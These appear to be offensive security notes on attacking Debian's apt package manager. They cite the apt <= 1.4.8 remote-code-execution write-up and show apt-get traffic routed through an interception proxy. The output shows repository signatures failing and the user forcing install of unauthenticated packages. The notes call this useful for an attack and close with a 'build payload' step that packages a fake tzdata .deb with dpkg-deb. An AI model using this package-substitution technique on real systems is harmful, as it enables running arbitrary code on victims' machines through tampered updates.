# APT attack

## apt <= 1.4.8

https://justi.cz/security/2019/01/22/apt-rce.html

## apt deb override

If we modify the requests : 

```
http://security-cdn.debian.org/debian-security/dists/stretch/updates/InRelease
http://deb.debian.org/debian/dists/stretch-updates/InRelease
http://cdn-fastly.deb.debian.org/debian/dists/stretch/InRelease
```

We observe the following behavior : 

```
$ docker run --rm -it debian /bin/sh -c "http_proxy=http://172.17.0.1:8080 apt-get update; http_proxy=http://172.17.0.1:8080 apt-get upgrade"
Get:1 http://security-cdn.debian.org/debian-security stretch/updates InRelease [94.3 kB]
Ign:1 http://security-cdn.debian.org/debian-security stretch/updates InRelease
Ign:2 http://cdn-fastly.deb.debian.org/debian stretch InRelease
Get:5 http://security-cdn.debian.org/debian-security stretch/updates/main amd64 Packages [487 kB]
Get:3 http://cdn-fastly.deb.debian.org/debian stretch-updates InRelease [91.0 kB]                                                                                                                                 
Ign:3 http://cdn-fastly.deb.debian.org/debian stretch-updates InRelease                                                                                                                                           
Get:4 http://cdn-fastly.deb.debian.org/debian stretch Release [118 kB]                                                                                                                                            
Get:6 http://cdn-fastly.deb.debian.org/debian stretch-updates/main amd64 Packages [11.1 kB]
Get:7 http://cdn-fastly.deb.debian.org/debian stretch Release.gpg [2434 B]
Ign:7 http://cdn-fastly.deb.debian.org/debian stretch Release.gpg
Get:8 http://cdn-fastly.deb.debian.org/debian stretch/main amd64 Packages [7082 kB]                                                                                                                               
Fetched 7886 kB in 35s (221 kB/s)                                                                                                                                                                                 
Reading package lists... Done
W: GPG error: http://security-cdn.debian.org/debian-security stretch/updates InRelease: The following signatures were invalid: BADSIG 9D6D8F6BC857C906 Debian Security Archive Automatic Signing Key (8/jessie) <ftpmaster@debian.org>
W: The repository 'http://security.debian.org/debian-security stretch/updates InRelease' is not signed.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.
W: GPG error: http://cdn-fastly.deb.debian.org/debian stretch-updates InRelease: The following signatures were invalid: BADSIG 8B48AD6246925553 Debian Archive Automatic Signing Key (7.0/wheezy) <ftpmaster@debian.org>
W: The repository 'http://deb.debian.org/debian stretch-updates InRelease' is not signed.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.
W: GPG error: http://cdn-fastly.deb.debian.org/debian stretch Release: The following signatures were invalid: BADSIG 8B48AD6246925553 Debian Archive Automatic Signing Key (7.0/wheezy) <ftpmaster@debian.org>
W: The repository 'http://deb.debian.org/debian stretch Release' is not signed.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  base-files libsystemd0 libudev1 tzdata
4 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 748 kB of archives.
After this operation, 2048 B of additional disk space will be used.
Do you want to continue? [Y/n] Y
WARNING: The following packages cannot be authenticated!
  base-files libsystemd0 libudev1 tzdata
Install these packages without verification? [y/N] y
Get:1 http://cdn-fastly.deb.debian.org/debian stretch/main amd64 base-files amd64 9.9+deb9u9 [67.4 kB]
```

We note that even if the signatures of the packages list is not validated, the user can force the download.

We can exploit this in 2 situations

- we are the user (we have sudo right to make the updates)
- the user choose y

More than useful for an attack ;).



### build payload

```
$ dpkg-deb --build tzdata/
$ dpkg-deb: building package 'tzdata' in 'tzdata.deb'.
```

